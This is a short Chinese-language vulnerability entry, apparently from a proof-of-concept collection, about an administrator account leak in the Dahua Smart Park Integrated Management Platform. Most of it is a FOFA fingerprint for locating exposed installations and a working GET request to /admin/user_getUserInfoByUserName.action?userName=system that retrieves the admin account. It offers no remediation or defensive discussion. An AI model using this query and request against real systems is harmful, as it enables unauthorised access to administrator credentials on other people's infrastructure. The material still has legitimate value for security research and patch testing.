# 大华 智慧园区综合管理平台 user_getUserInfoByUserName.action接口管理员账户泄露

## 漏洞描述

大华 智慧园区综合管理平台 user_getUserInfoByUserName.action接口管理员账户泄露

## 漏洞影响

```
All
```

## FOFA

```
fid="+GO1WAVdxlPk6WCq1FIWDg=="
```

## 漏洞复现

登陆页面

![image-20230816111134054](img/image-20230816111134054.png)

验证POC

```
GET /admin/user_getUserInfoByUserName.action?userName=system
```

![image-20230816111326869](img/image-20230816111326869.png)

## Python poc

```
暂无
```

